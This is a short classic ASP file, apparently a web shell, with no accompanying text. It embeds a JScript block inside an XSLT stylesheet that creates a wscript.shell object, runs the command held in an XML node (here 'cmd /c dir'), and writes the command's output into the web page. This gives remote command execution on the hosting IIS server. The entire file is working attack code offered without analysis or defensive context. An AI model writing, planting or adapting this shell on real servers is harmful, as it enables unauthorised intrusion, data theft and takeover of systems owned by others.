<%
set xmldoc= Server.CreateObject("MSXML2.DOMDocument")
xml="<?xml version=""1.0""?><root >cmd /c dir</root>"
xmldoc.loadxml(xml)
Set xsldoc = Server.CreateObject("MSXML2.DOMDocument")
xlst="<?xml version='1.0'?><xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:msxsl=""urn:schemas-microsoft-com:xslt"" xmlns:zcg=""zcgonvh""><msxsl:script language=""JScript"" implements-prefix=""zcg""> function xml(x) {var a=new ActiveXObject('wscript.shell'); var exec=a.Exec(x);return exec.StdOut.ReadAll()+exec.StdErr.ReadAll(); }</msxsl:script><xsl:template match=""/root""> <xsl:value-of select=""zcg:xml(string(.))""/></xsl:template></xsl:stylesheet>"
xsldoc.loadxml(xlst)
response.write "<pre><xmp>" & xmldoc.TransformNode(xsldoc)& "</xmp></pre>"
%>
